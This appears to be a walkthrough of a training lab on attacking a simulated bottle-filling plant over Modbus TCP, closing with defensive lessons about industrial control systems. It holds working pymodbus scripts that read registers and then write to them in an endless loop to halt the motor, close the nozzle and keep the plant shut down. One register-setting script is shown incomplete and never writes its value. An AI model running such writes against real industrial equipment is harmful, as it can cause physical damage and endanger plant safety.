## What is Modbus?

Modbus is an industrial protocol developed by Modicon, acquired by Schneider Electric. Modbus is widely used to connect industrial devices; protocol specification is available and royalty-free.
Modbus protocol is a master/slave protocol: the master reads and writes slaves' registers.

Modbus RTU is usually used via RS-485 (serial network): one master is present with one or more slaves. Each slave has an unique 8-bit address. Modbus data is used to read and write "registers" which are 16-bit long. The most common register is called "holding register" which is readable and writable; registry type "input register" is readable only. The registers "coil" and "discrete input" are 1-bit long: coils are readable and writable, discrete inputs are readable only. Modbus register types:

- Discrete Input (Status Input): 1bit, RO
- Coil (Discrete Output): 1bit, R/W
- Input Register: 16bit, RO
- Holding Register: 16bit R/W

Modbus TCP encapsulates Modbus RTU request and response data packets in a TCP packet transmitted over standard Ethernet networks. The TCP Modbus standard port is 502.


## Discovery

After installing `pymodbus`, a python library that allows us to use modbus through python scripts, we can start the THM walkthrough. First, I navigated to the http-server `http://10.112.159.127` that the target machine exposed and I tried to understand how the plant worked: Empty bottles move on a roller, stop under a nozzle, are filled until a certain level, and then move on until the next empty bottle is below the nozzle etc.

The first technical task was to run a discovery script:

```python
# discovery.py
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
    rr = client.read_holding_registers(1, 16)
    print(rr.registers)
    time.sleep(1)
```

This script connects to the client on port 502 and retrieves the holding register once every second. Running the script with `python3 discovery.py 10.112.159.127`, we get an output as follows:

## Play to Learn
The next goal was thus to determine which register controlled the nozzle, for this, I used the `set_registry.py`:

```python
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
registry = int(sys.argv[2])
value = int(sys.argv[3])
client = ModbusClient(ip, port=502)
client.connect()
```

By trial and error I found that register 4 does the job, i.e. running `python3 set_registry.py 10.112.159.127 4 0` closed the nozzle and `python3 set_registry.py 10.112.159.127 4 1` opened it. In practice this yielded some overflow and then the last container was only filled halfway, thus stopping the roller altogether, and even toppling over the containers:

## Attack
The final chapter in this room is just a collection of short scripts that exploit what we have learned so far. The first task is to shutdown the plant and avoid the plant manager starting it up again. For this, I used the following script:

```python
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
  client.write_register(3, 0)  # Stop the motor
  client.write_register(4, 0)  # Close the nozzle
  client.write_register(16, 0) # Shutdown the plant
```

Every other task that follows is simply some slight adjustment of this script, since we learned the role and values of the relevant registries 1,2,3,4,5 and 16.


## Lessons Learned

- The native Modbus protocol is extremely vulnerable to abuse if an adversary has access to the machine, i.e. if the port is unsecured and the attacker is in the plant's internal network.
- Never expose ICS components to the internet.
- In the case of ICS components it is abundantly clear that exploitation of OT-vulnerabilities may have catastrophic real-world ramifications.
